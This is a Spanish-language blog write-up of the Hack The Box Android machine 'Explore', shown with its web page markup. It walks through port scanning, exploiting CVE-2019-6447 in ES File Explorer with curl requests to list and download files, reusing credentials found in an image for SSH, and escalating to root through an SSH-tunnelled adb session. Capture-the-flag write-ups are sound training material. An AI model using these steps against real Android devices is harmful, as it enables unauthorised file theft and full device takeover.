<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#D9389C}</style><title>Explore</title><meta name=description content="He regresado por la revancha"><meta name=keywords content="Bas1cTF,HTB,writeup,writeups,Android"><meta property="og:url" content="https://bas1ctf.github.io/posts/explore/"><meta property="og:type" content="website"><meta property="og:title" content="Explore"><meta property="og:description" content="He regresado por la revancha"><meta property="og:image" content="/images/avatar.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Explore"><meta name=twitter:description content="He regresado por la revancha"><meta property="twitter:domain" content="https://bas1ctf.github.io/posts/explore/"><meta property="twitter:url" content="https://bas1ctf.github.io/posts/explore/"><meta name=twitter:image content="/images/avatar.jpg"><link rel=canonical href=https://bas1ctf.github.io/posts/explore/><link rel=stylesheet type=text/css href=https://bas1ctf.github.io//css/normalize.min.css media=print onload='this.media="all"'><link rel=stylesheet type=text/css href=https://bas1ctf.github.io//css/main.css><link disabled id=dark-theme rel=stylesheet href=https://bas1ctf.github.io//css/dark.css><script src=https://bas1ctf.github.io//js/svg-injector.min.js></script>
<script src=https://bas1ctf.github.io//js/feather-icons.min.js></script>
<script src=https://bas1ctf.github.io//js/main.js></script></head><body><script type=text/javascript>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://bas1ctf.github.io/><img src=https://bas1ctf.github.io//images/avatar.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://bas1ctf.github.io/>Bas1cTF</a></div><div class=nav-links><div class=nav-link><a href=https://bas1ctf.github.io/><span data-feather=home></span> Home</a></div><div class=nav-link><a href=https://bas1ctf.github.io/posts/><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://bas1ctf.github.io/tags/><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://github.com/Bas1cTF><span data-feather=github></span></a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only></span>
<a><span id=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://bas1ctf.github.io/><span data-feather=home></span> Home</a></li><li class=nav-item><a href=https://bas1ctf.github.io/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://bas1ctf.github.io/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://github.com/Bas1cTF><span data-feather=github></span></a></li><li class="nav-item dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only>theme</span>
<a><span id=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>Explore</h1><small role=doc-subtitle>He regresado por la revancha</small><p class=post-date>agosto 28, 2022</p><ul class=post-tags><li class=post-tag><a href=https://bas1ctf.github.io/tags/htb>HTB</a></li><li class=post-tag><a href=https://bas1ctf.github.io/tags/writeups>writeups</a></li><li class=post-tag><a href=https://bas1ctf.github.io/tags/android>Android</a></li></ul></div><div class=post-content><p><p><img src=/images/Explore.png alt=Banner></p><h1 id=enumeración>Enumeración</h1><p>Realizando un escano de puertos identificamos cuatro puertos abiertos.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ sudo nmap -sS --min-rate <span style=color:#ae81ff>5000</span> -vvv -open -p- -n -Pn -oG nmap/all_ports 10.10.10.247
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> kali: 
</span></span><span style=display:flex><span>Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times may be slower. 
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-29 22:36 EDT
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 22:36
</span></span><span style=display:flex><span>Scanning 10.10.10.247 <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 42135/tcp on 10.10.10.247
</span></span><span style=display:flex><span>Discovered open port 59777/tcp on 10.10.10.247
</span></span><span style=display:flex><span>Discovered open port 34039/tcp on 10.10.10.247
</span></span><span style=display:flex><span>Discovered open port 2222/tcp on 10.10.10.247
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 22:37, 15.77s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.247
</span></span><span style=display:flex><span>Host is up, received user-set <span style=color:#f92672>(</span>0.092s latency<span style=color:#f92672>)</span>. 
</span></span><span style=display:flex><span>Scanned at 2022-08-29 22:36:54 EDT <span style=color:#66d9ef>for</span> 16s
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65530</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>, <span style=color:#ae81ff>1</span> filtered tcp port <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style=display:flex><span>PORT      STATE SERVICE      REASON
</span></span><span style=display:flex><span>2222/tcp  open  EtherNetIP-1 syn-ack ttl <span style=color:#ae81ff>63</span>
</span></span><span style=display:flex><span>34039/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>63</span>
</span></span><span style=display:flex><span>42135/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>63</span>
</span></span><span style=display:flex><span>59777/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>63</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 15.90 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>78350</span> <span style=color:#f92672>(</span>3.447MB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>78347</span> <span style=color:#f92672>(</span>3.134MB<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Procedemos a realizar un escaneo específico de los puertos encontrados para tratar de averiguar que servicios estan funcionando en los puertos encontrados.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ nmap -sCV -p 2222,34039,42135,59777 -Pn -oN nmap/targeted 10.10.10.247       
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-29 22:47 EDT                                               
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.247                 
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.12s latency<span style=color:#f92672>)</span>.                                         
</span></span><span style=display:flex><span>PORT      STATE SERVICE VERSION                                           
</span></span><span style=display:flex><span>2222/tcp  open  ssh     <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| fingerprint-strings:
</span></span><span style=display:flex><span>|   NULL:
</span></span><span style=display:flex><span>|_    SSH-2.0-SSH Server - Banana Studio
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>2048</span> 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>                          
</span></span><span style=display:flex><span>34039/tcp open  unknown                                           
</span></span><span style=display:flex><span>| fingerprint-strings:                             
</span></span><span style=display:flex><span>|   GenericLines:                                     
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#ae81ff>400</span> Bad Request                                           
</span></span><span style=display:flex><span>|     Date: Tue, <span style=color:#ae81ff>30</span> Aug <span style=color:#ae81ff>2022</span> 02:47:38 GMT                                               
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>22</span>                                                
</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset<span style=color:#f92672>=</span>US-ASCII  
</span></span><span style=display:flex><span>|     Connection: Close                  
</span></span><span style=display:flex><span>|     Invalid request line:                 
</span></span><span style=display:flex><span>|   GetRequest:                          
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>412</span> Precondition Failed       
</span></span><span style=display:flex><span>|     Date: Tue, <span style=color:#ae81ff>30</span> Aug <span style=color:#ae81ff>2022</span> 02:47:38 GMT         
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>0</span>                   
</span></span><span style=display:flex><span>|   HTTPOptions:                        
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#ae81ff>501</span> Not Implemented             
</span></span><span style=display:flex><span>|     Date: Tue, <span style=color:#ae81ff>30</span> Aug <span style=color:#ae81ff>2022</span> 02:47:43 GMT   
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>29</span>
</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset<span style=color:#f92672>=</span>US-ASCII
</span></span><span style=display:flex><span>|     Connection: Close
</span></span><span style=display:flex><span>|     Method not supported: OPTIONS
</span></span><span style=display:flex><span>|   Help: 
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#ae81ff>400</span> Bad Request
</span></span><span style=display:flex><span>|     Date: Tue, <span style=color:#ae81ff>30</span> Aug <span style=color:#ae81ff>2022</span> 02:48:00 GMT
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>26</span>   
</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset<span style=color:#f92672>=</span>US-ASCII
</span></span><span style=display:flex><span>|     Connection: Close
</span></span><span style=display:flex><span>|     Invalid request line: HELP
</span></span><span style=display:flex><span>|   RTSPRequest:
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#ae81ff>400</span> Bad Request
</span></span><span style=display:flex><span>|     Date: Tue, <span style=color:#ae81ff>30</span> Aug <span style=color:#ae81ff>2022</span> 02:47:43 GMT
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>39</span>
</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset<span style=color:#f92672>=</span>US-ASCII
</span></span><span style=display:flex><span>|     Connection: Close
</span></span><span style=display:flex><span>|     valid protocol version: RTSP/1.0
</span></span><span style=display:flex><span>|   SSLSessionReq:
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#ae81ff>400</span> Bad Request
</span></span><span style=display:flex><span>|     Date: Tue, <span style=color:#ae81ff>30</span> Aug <span style=color:#ae81ff>2022</span> 02:48:00 GMT
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>73</span>
</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset<span style=color:#f92672>=</span>US-ASCII
</span></span><span style=display:flex><span>|     Connection: Close
</span></span><span style=display:flex><span>|     Invalid request line:
</span></span><span style=display:flex><span>|     ?G???,???<span style=color:#e6db74>`</span>~?
</span></span><span style=display:flex><span>|     ??<span style=color:#f92672>{</span>????w????&lt;<span style=color:#f92672>=</span>?o?
</span></span><span style=display:flex><span>|   TLSSessionReq:
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#ae81ff>400</span> Bad Request
</span></span><span style=display:flex><span>|     Date: Tue, <span style=color:#ae81ff>30</span> Aug <span style=color:#ae81ff>2022</span> 02:48:01 GMT
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>71</span>
</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset<span style=color:#f92672>=</span>US-ASCII
</span></span><span style=display:flex><span>|     Connection: Close
</span></span><span style=display:flex><span>|     Invalid request line:
</span></span><span style=display:flex><span>|     ??random1random2random3random4
</span></span><span style=display:flex><span>|   TerminalServerCookie:
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#ae81ff>400</span> Bad Request
</span></span><span style=display:flex><span>|     Date: Tue, <span style=color:#ae81ff>30</span> Aug <span style=color:#ae81ff>2022</span> 02:48:01 GMT
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>54</span>
</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset<span style=color:#f92672>=</span>US-ASCII
</span></span><span style=display:flex><span>|     Connection: Close
</span></span><span style=display:flex><span>|     Invalid request line:
</span></span><span style=display:flex><span>|_    Cookie: mstshash<span style=color:#f92672>=</span>nmap
</span></span><span style=display:flex><span>42135/tcp open  http    ES File Explorer Name Response httpd
</span></span><span style=display:flex><span>|_http-title: Site doesn<span style=color:#e6db74>&#39;t have a title (text/html).
</span></span></span><span style=display:flex><span><span style=color:#e6db74>59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_http-title: Site doesn&#39;</span>t have a title <span style=color:#f92672>(</span>text/plain<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span><span style=color:#f92672>==============</span>NEXT SERVICE FINGERPRINT <span style=color:#f92672>(</span>SUBMIT INDIVIDUALLY<span style=color:#f92672>)==============</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>Service Info: Device: phone
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done -- 1 IP address (1 host up) scanned in 111.19 seconds</span>
</span></span></code></pre></div><h2 id=puerto-59777>Puerto 59777</h2><p>Al buscar información sobre los puertos que no pudieron ser identificados, encontramos que el puerto 59777 está relacionado con el CVE-2019-6447 correspondiente a la aplicación ES File Explorer misma que sabemos esta ejecutandose en el dispositivo por el puerto 42135.</p><h1 id=explotación>Explotación</h1><p>Podemos enviar peticiones al puerto 59777 con un comando a ejecutar por medio de json, por ejemplo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>curl http://$TARGET:59777/ -d <span style=color:#e6db74>&#34;{&#39;command&#39;:listFiles}&#34;</span>
</span></span></code></pre></div><p>Los comandos aceptados son los siguientes:</p><ul><li>listFiles</li><li>listPics</li><li>listVideos</li><li>listAudios</li><li>listApps</li><li>listAppsSystem</li><li>listAppsPhone</li><li>listAppsSdcard</li><li>listAppsAll</li><li>getDeviceInfo</li></ul><p>Listando las imagenes con el comando <code>listPics</code> encontramos el archivo <code>creds.jpg</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-JSON data-lang=JSON><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>{</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;creds.jpg&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;time&#34;</span>:<span style=color:#e6db74>&#34;4/21/21 02:38:18 AM&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;location&#34;</span>:<span style=color:#e6db74>&#34;/storage/emulated/0/DCIM/creds.jpg&#34;</span>, 
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;size&#34;</span>:<span style=color:#e6db74>&#34;1.14 MB (1,200,401 Bytes)&#34;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}</span>
</span></span></code></pre></div><p>Para descargar la imagen simplemente hacemos una petición GET al path completo de la imagen.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>curl http://$TARGET:59777/storage/emulated/0/DCIM/creds.jpg -o creds.jpg
</span></span></code></pre></div><p>La imagen contiene credenciales, las cuales probamos para conectarnos por medio de SSH.</p><p><em>Si no se puede establecer la conexión modificar el archivo <code>~/.ssh/config</code> con lo siguiente:</em></p><pre tabindex=0><code>host 10.10.10.247
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
</code></pre><p>Al conectarnos por SSH podemos acceder a la flag de usuario localizada en el directorio <code>/storage/emulated/0</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>:/storage/emulated/0 $ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>10076<span style=color:#f92672>(</span>u0_a76<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>10076<span style=color:#f92672>(</span>u0_a76<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>10076<span style=color:#f92672>(</span>u0_a76<span style=color:#f92672>)</span>,3003<span style=color:#f92672>(</span>inet<span style=color:#f92672>)</span>,9997<span style=color:#f92672>(</span>everybody<span style=color:#f92672>)</span>,20076<span style=color:#f92672>(</span>u0_a76_cache<span style=color:#f92672>)</span>,50076<span style=color:#f92672>(</span>all_a76<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>u:r:untrusted_app:s0:c76,c256,c512,c768
</span></span><span style=display:flex><span>:/storage/emulated/0 $ ls
</span></span><span style=display:flex><span>Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
</span></span><span style=display:flex><span>Android Download Music  Pictures      Ringtones dianxinos
</span></span></code></pre></div><h1 id=escalación-de-privilegios>Escalación de Privilegios</h1><p>Enumeramos los puertos TCP que esten en escucha.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>:/ $ ss -antl
</span></span><span style=display:flex><span>State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              
</span></span><span style=display:flex><span>LISTEN      <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>50</span>           *:59777                    *:*                  
</span></span><span style=display:flex><span>LISTEN      <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>8</span>       <span style=color:#f92672>[</span>::ffff:127.0.0.1<span style=color:#f92672>]</span>:38535                    *:*                  
</span></span><span style=display:flex><span>LISTEN      <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>50</span>       <span style=color:#f92672>[</span>::ffff:10.10.10.247<span style=color:#f92672>]</span>:40107                    *:*                  
</span></span><span style=display:flex><span>LISTEN      <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>50</span>           *:2222                     *:*                  
</span></span><span style=display:flex><span>LISTEN      <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>4</span>            *:5555                     *:*                  
</span></span><span style=display:flex><span>LISTEN      <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>10</span>           *:42135                    *:*    
</span></span></code></pre></div><p>Observando los puertos disponibles encontramos el puerto 5555, correspondiente al debugger en android, entonces podemos hacer un tunnel a tráves de ssh para así interactuar con la herramienta adecuada.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>ssh kristi@10.10.10.247 -p <span style=color:#ae81ff>2222</span> -L 5555:localhost:5555
</span></span></code></pre></div><p>Ya en nuestro terminal podemos conectarnos mediante adb y forzar el acceso usuario root desde la misma herramienta.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>└─$ adb connect localhost:5555
</span></span><span style=display:flex><span>* daemon not running; starting now at tcp:5037
</span></span><span style=display:flex><span>* daemon started successfully
</span></span><span style=display:flex><span>connected to localhost:5555
</span></span><span style=display:flex><span>└─$ adb -s localhost:5555 root <span style=color:#75715e># Forzamos el acceso a root</span>
</span></span><span style=display:flex><span>restarting adbd as root
</span></span><span style=display:flex><span>└─$ adb -s localhost:5555 shell
</span></span><span style=display:flex><span>x86_64:/  id          
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,1004<span style=color:#f92672>(</span>input<span style=color:#f92672>)</span>,1007<span style=color:#f92672>(</span>log<span style=color:#f92672>)</span>,1011<span style=color:#f92672>(</span>adb<span style=color:#f92672>)</span>,1015<span style=color:#f92672>(</span>sdcard_rw<span style=color:#f92672>)</span>,1028<span style=color:#f92672>(</span>sdcard_r<span style=color:#f92672>)</span>,3001<span style=color:#f92672>(</span>net_bt_admin<span style=color:#f92672>)</span>,3002<span style=color:#f92672>(</span>net_bt<span style=color:#f92672>)</span>,3003<span style=color:#f92672>(</span>inet<span style=color:#f92672>)</span>,3006<span style=color:#f92672>(</span>net_bw_stats<span style=color:#f92672>)</span>,3009<span style=color:#f92672>(</span>readproc<span style=color:#f92672>)</span>,3011<span style=color:#f92672>(</span>uhid<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>u:r:su:s0
</span></span></code></pre></div><p>Y listo tenemos acceso como root</p><p>La flag de root la encontramos en el directorio <code>/data</code>.</p><h1 id=referencias>Referencias</h1><p><a href=https://www.exploit-db.com/exploits/50070>CVE-2019-6447 - ExploitDB</a></p><p><a href=https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge>Port 5555 - HackTricks</a></p></p></div></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#enumeración>Enumeración</a><ul><li><a href=#puerto-59777>Puerto 59777</a></li></ul></li><li><a href=#explotación>Explotación</a></li><li><a href=#escalación-de-privilegios>Escalación de Privilegios</a></li><li><a href=#referencias>Referencias</a></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2022 SSBsb3ZlIHlvdTwz</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>